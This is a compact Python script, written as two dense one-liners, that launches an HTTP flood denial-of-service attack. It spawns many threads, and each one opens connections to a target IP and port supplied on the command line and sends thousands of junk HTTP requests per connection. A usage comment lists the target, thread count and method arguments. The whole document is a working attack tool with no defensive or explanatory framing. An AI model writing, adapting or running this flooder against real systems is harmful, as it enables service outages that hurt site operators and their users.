import socket,threading,sys,random,string
def http_flood(add,method,count):p = f'{method} /{"".join(random.choices(string.ascii_letters+string.digits+string.punctuation, k=1))} HTTP/1.1\nHost: {add[0]}\n\n\r\r'; [[s.send(p.encode()) for _ in range(2500)] + [s.close()] for _ in range(count) if (s := socket.create_connection(add))]
[threading.Thread(target=http_flood,args=((sys.argv[1],int(sys.argv[2])),sys.argv[5],int(sys.argv[4]))).start() for _ in range(int(sys.argv[3])*5)] # <IP> <PORT> <THREAD> <TIME> <METHOD_HTTP>
